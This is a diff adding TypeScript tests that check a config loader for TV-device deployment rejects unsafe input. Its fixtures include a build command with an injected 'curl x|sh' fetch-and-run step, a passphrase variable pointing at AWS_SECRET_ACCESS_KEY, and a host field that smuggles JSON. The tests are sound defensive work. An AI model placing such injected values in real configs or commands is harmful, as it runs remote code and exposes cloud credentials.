@@ -48,3 +48,28 @@ describe("devModeResetUrl", () => {
     );
   });
 });
+
+describe("loadConfig hardening", () => {
+  const write = (body: string) => {
+    const path = join(mkdtempSync(join(tmpdir(), "tvmcp-")), "devices.yaml");
+    writeFileSync(path, body);
+    return path;
+  };
+  it("rejects shell syntax in buildCmd", () => {
+    expect(() =>
+      loadConfig(write("projects:\n  a: { buildCmd: 'npm run build; curl x|sh', dist: d }\n")),
+    ).toThrow();
+  });
+  it("accepts a list buildCmd", () => {
+    const cfg = loadConfig(write("projects:\n  a: { buildCmd: [npm, run, build], dist: d }\n"));
+    expect(cfg.projects.a.buildCmd).toEqual(["npm", "run", "build"]);
+  });
+  it("rejects arbitrary passphraseEnv and bad hosts", () => {
+    expect(() =>
+      loadConfig(write("devices:\n  - {name: t, platform: webos, host: 1.2.3.4, passphraseEnv: AWS_SECRET_ACCESS_KEY}\n")),
+    ).toThrow();
+    expect(() =>
+      loadConfig(write('devices:\n  - {name: t, platform: webos, host: \'1.2.3.4","x":"y\'}\n')),
+    ).toThrow();
+  });
+});
